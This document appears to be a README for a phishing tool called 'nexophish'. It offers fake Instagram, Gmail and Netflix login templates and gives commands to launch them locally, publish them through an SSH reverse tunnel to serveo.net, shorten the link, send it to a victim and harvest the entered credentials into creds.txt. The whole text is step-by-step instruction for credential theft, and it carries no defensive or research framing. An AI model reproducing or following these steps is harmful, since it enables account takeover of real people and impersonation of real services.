[lrean.docx](https://github.com/user-attachments/files/19939959/lrean.docx)

HOW TO USE
there's three template options 
  ->instagram
  ->gmail
  ->netfix

COMMANDS
-to start any phishing page locally

$cd phisher
$python3 nexophish.py instagram      //you can replace any template among these three//

-now you will see a local link hosting your template page where user can login.
-to make it public open new terminal and use use that command (but make sure you have servo.net installed and configured check above document) 

$ssh -R 80:localhost:9000 serveo.net 

-now the public link that you can share is available , you can shorten it and send to victim and wait
-the credentials will be save in creds.txt file in root folder of tool.
